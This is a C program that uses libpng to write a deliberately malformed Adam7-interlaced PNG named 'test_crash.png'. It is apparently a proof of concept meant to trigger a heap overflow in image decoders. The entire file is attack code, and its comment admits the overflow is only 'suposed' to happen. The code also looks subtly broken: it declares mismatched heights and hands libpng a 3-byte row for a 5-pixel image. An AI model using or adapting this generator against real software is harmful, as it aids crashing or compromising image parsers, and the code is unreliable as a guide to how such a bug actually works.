#include <stdio.h>
#include <stdlib.h>
#include <png.h>
#include <stdint.h>
#include <string.h>

#define WIDTH 5  
#define HEIGHT 1
#define FILENAME "test_crash.png"  // saves in your current directory

// Create mal-formed Adam7 interlaced image
void generate_malicious_png(const char *filename) {
    FILE *fp = fopen(filename, "wb");
    if (!fp) {
        perror("[ERROR] Could not create PNG file");
        exit(1);
    }

    png_structp png_ptr = png_create_write_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
    png_infop info_ptr = png_create_info_struct(png_ptr);
    if (!png_ptr || !info_ptr) {
        fprintf(stderr, "[ERROR] Failed to create PNG write struct.\n");
        fclose(fp);
        exit(1);
    }

    if (setjmp(png_jmpbuf(png_ptr))) {
        fprintf(stderr, "[ERROR] libpng write error.\n");
        png_destroy_write_struct(&png_ptr, &info_ptr);
        fclose(fp);
        exit(1);
    }

    png_init_io(png_ptr, fp);
    png_set_IHDR(png_ptr, info_ptr, WIDTH, 7,  // HEIGHT = 7 for Adam7 passes
                 8, PNG_COLOR_TYPE_RGB, PNG_INTERLACE_ADAM7,
                 PNG_COMPRESSION_TYPE_DEFAULT, PNG_FILTER_TYPE_DEFAULT);
    png_write_info(png_ptr, info_ptr);

    // Allocate one very wide row for the vulnerable pass
    png_bytep big_row = (png_bytep)malloc(WIDTH * 3);
    memset(big_row, 0xFF, WIDTH * 3);

    // Allocate small row for the others
    png_bytep small_row = (png_bytep)malloc(3);  // 1 pixel RGB
    memset(small_row, 0x00, 3);

    // This is suposed to cause a heap overflow
    for (int i = 0; i < 7; ++i) {
        if (i == 3) {  // Arbitrary: choose one pass to use the big row
            png_write_row(png_ptr, big_row);
        } else {
            png_write_row(png_ptr, small_row);
        }
    }

    png_write_end(png_ptr, NULL);
    free(big_row);
    free(small_row);
    png_destroy_write_struct(&png_ptr, &info_ptr);
    fclose(fp);

}


int main() {
    printf("[INFO] Program started.\n");

    generate_malicious_png(FILENAME);

    return 0;
}
